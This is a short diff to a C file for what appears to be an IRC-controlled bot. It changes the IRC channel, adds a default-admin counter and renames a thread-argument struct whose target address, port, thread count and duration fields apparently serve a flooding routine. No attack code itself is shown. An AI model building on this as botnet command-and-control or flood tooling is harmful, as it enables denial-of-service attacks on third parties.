@@ -55,7 +55,7 @@
  */
 #define SERVER     "irc.freenode.net"   // IRC server
 #define PORT       "6667"           // server port
-#define CHANNEL    "#nullbyte"       // channel name
+#define CHANNEL    "#uuiiafa"       // channel name
 //#define U_NAME     "JSchmoeBot"     // username
 //#define N_NAME     "JSchmoeBot"     // nickname
 #define IRC_PWORD  NULL             // password for nickname
@@ -113,6 +113,7 @@ typedef struct _account {
     char **admins;
     unsigned char admin_size;       // size of admins array
     unsigned char num_admins;       // number of admins
+    unsigned char num_default;      // number of default admins
 } Account, *pAccount;
 
 /*
@@ -132,14 +133,14 @@ typedef struct _message {
     int msgSize;
 } Message, *pMessage;
 
-typedef struct _thr_args {
+typedef struct _thd_args {
     SOCKET s;
     char *contact;
     char *addr;
     char *port;
     int threads;
     int time;
-} thr_args;
+} thd_args;
 
 /*
  * need to define some tcp/ip
